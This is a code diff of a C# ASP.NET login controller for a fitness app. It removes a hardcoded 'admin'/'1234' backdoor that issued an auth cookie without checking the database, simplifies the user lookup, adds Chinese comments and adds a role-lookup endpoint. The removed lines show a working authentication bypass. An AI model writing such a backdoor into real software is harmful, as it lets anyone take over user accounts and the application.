@@ -231,34 +231,18 @@ namespace PhysicalFit.Controllers
         {
             try
             {
-                string backdoorUser = "admin";
-                string backdoorPwd = "1234";
-
-                if (account == backdoorUser && pwd == backdoorPwd)
-                {
-                    FormsAuthentication.SetAuthCookie(backdoorUser, false);
-                    return RedirectToAction("dashboard", "PhyFit");
-                }
-
                 string hashedPwd = ComputeSha256Hash(pwd);
                 Users user = null;
 
-                if (IsIdentityNumber(account))
-                {
-                    //string encryptedIdentityNumber = EncryptionHelper.Encrypt(account);
-                    user = _db.Users.FirstOrDefault(u => u.Account == account && u.Password == hashedPwd);
-                }
-                else
-                {
-                    user = _db.Users.FirstOrDefault(u => u.Account == account && u.Password == hashedPwd);
-                }
+                // 驗證身份並查詢用戶
+                user = _db.Users.FirstOrDefault(u => u.Account == account && u.Password == hashedPwd);
 
                 if (user != null)
                 {
-                    user.LastLoginDate = DateTime.Now;
+                    user.LastLoginDate = DateTime.Now; //更新用戶的最後登入時間
                     _db.SaveChanges();
 
-                    // 設定 Session
+                    //設定 Session，根據 CoachID 判斷用戶角色
                     Session["UserRole"] = user.CoachID.HasValue ? "Coach" : "Athlete";
 
                     // 設定 FormsAuthentication Ticket
@@ -271,6 +255,7 @@ namespace PhysicalFit.Controllers
                         user.CoachID.HasValue ? user.CoachID.Value.ToString() : user.AthleteID.ToString(),
                         FormsAuthentication.FormsCookiePath);
 
+                    //加密並設定 Cookie
                     string encryptedTicket = FormsAuthentication.Encrypt(authTicket);
                     var authCookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket)
                     {
@@ -301,6 +286,12 @@ namespace PhysicalFit.Controllers
             // 根據實際情況設置身份證號碼的格式檢查
             // 這裡假設身份證號碼為數字和字母組成，並且長度為特定的數字
             //return Regex.IsMatch(account, "^[A-Za-z][0-9]{9}$"); // 假設身份證是1個字母+9個數字
+        }
+
+        public JsonResult GetUserRole()
+        {
+            var userRole = Session["UserRole"]?.ToString();
+            return Json(new { userRole }, JsonRequestBehavior.AllowGet);
         }
 
         #endregion
